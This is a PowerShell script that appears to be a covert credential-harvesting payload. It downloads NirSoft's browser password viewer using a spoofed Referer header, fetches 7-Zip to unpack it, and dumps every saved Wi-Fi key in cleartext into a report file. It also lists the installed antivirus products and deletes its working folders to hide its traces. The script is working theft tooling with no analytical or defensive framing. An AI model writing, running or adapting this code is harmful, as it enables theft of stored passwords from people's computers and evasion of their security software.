$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {

  cd $RECONAPPS
  Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip

}


function Wifi {
$WiFi = New-Item -Path $env:temp -Name "RECON_APPS" -ItemType "directory"
Set-Location -Path $P1X3L; netsh wlan export profile key=clear
Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $P1X3L\WiFi_Passwords-RECON_Report.txt
Set-Location -Path "$P1X3L"
Remove-Item -Path "$P1X3L\RECON_APPS" -Force -Recurse;
}

 function Del-Nirsoft-File {
  cd $P1X3L
  rmdir -R $P1X3L\RECONAPPS
}

function version-av {
  cd $P1X3L
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath $P1X3L\resultat.txt -Encoding utf8
}
